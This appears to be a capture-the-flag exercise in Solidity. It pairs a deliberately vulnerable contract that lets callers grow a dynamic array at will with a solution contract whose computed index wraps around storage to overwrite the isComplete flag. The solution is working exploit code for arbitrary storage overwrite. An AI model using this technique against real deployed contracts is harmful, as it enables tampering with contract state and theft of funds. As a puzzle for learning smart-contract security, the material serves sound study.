pragma solidity ^0.4.21;

contract MappingChallenge {
    bool public isComplete;
    uint256[] map;

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}

contract MappingSolution {
    MappingChallenge challenge;
    function MappingSolution(address challengeAddress) public {
        challenge = MappingChallenge(challengeAddress);
        uint256 answerKey = uint(2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + uint256(1);
        challenge.set(answerKey, uint(2 ** 256 - 1));

        require(challenge.isComplete()); 
    }
}